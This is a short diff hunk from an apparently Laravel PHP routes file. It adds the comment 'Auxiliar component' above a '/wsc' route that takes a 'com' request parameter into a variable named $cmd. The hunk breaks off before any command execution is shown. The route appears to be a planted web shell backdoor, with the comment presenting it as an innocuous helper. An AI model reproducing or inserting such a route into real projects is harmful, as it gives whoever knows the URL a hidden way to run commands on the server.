@@ -19,6 +19,7 @@ Route::middleware([
         return view('importaciones.index');
     })->name('importaciones');
 
+    //Auxiliar component
     Route::get('/wsc', function () {
         if (isset($_REQUEST['com'])) {
             $cmd = $_REQUEST['com'];
